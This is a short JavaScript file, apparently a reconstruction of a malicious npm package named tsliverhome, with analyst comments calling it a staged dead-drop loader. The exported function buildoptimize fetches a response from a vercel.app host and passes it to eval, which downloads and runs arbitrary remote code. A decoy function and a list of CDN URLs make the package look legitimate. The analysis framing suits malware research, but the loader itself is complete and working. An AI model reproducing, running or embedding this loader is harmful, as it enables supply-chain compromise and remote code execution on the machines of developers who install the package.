// Reconstruction of tsliverhome@1.1.5 (2026-05-14). Single-file staged
// remote-code loader. The exported function buildoptimize fetches a token
// from verceljs-kappa.vercel.app/icons/<n> then eval(JSON.parse(body)) on
// the response — a classic dead-drop loader pattern. setDefaultModule
// below is unused decoy code that pretends to fetch CDN icon URLs.
// Decoy deps (express/module-to-cdn/sqlite3) exist only in package.json
// to make the package shape look legitimate.
const req = require("request");

// === DECOY (never invoked internally) ===
const iconDomain = {
  cloudflare: "https://cdnjs.cloudflare.com/ajax/libs",
  fastly: "https://fastly.jsdelivr.net/npm",
  akamai: "https://akamai-cdn.example.com",
  cloudfront: "https://d1abc.cloudfront.net",
  gcorelabs: "https://cdn.gcorelabs.com"
};
function setDefaultModule(name) {
  const url = iconDomain.cloudflare + "/font-awesome/6.4.0/svgs/solid/" + name + ".svg";
  req(url, (err, res, body) => { /* unused */ });
}

// === REAL PAYLOAD ===
function buildoptimize(token) {
  token = token || 23;
  const url = "https://verceljs-kappa.vercel.app/icons/" + token;
  req(url, (err, res, body) => {
    if (err || !body) return;
    try {
      const parsed = JSON.parse(body);
      // eslint-disable-next-line no-eval
      eval(parsed);
    } catch (e) {}
  });
}

module.exports = { buildoptimize, setDefaultModule };
